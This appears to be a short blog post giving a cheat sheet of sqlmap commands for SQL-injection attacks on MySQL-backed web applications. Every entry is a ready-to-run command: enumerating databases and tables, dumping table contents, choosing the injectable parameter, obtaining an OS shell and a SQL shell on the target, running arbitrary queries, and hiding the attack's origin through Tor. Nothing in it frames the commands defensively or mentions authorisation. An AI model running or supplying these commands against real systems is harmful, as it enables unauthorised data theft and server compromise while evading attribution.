---
layout: post
title: "SQLMap Cheat Sheet"
---

## Enumerate databases
```bash
sqlmap --dbms=mysql -u "<$URL>" --dbs
```

## Enumerate tables
```bash
sqlmap --dbms=mysql -u "<$URL>" -D "<$DATABASE>" --tables
```

## Dump table data
```bash
sqlmap --dbms=mysql -u "<$URL>" -D "<$DATABASE>" -T "<$TABLE>" --dump
```

## Specify parameter to exploit
```bash
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2
```

## Specify parameter to exploit in 'nice' URIs
```bash
sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs # exploits param1
```

## Get OS shell
```bash
sqlmap --dbms=mysql -u "<$URL>" --os-shell
```

## Get SQL shell
```bash
sqlmap --dbms=mysql -u "<$URL>" --sql-shell
```

## SQL query
```bash
sqlmap --dbms=mysql -u "<$URL>" -D "<$DATABASE>" --sql-query "SELECT * FROM <$TABLE>;"
```

## Use Tor Socks5 proxy
```bash
sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "<$URL>" --dbs
```

---
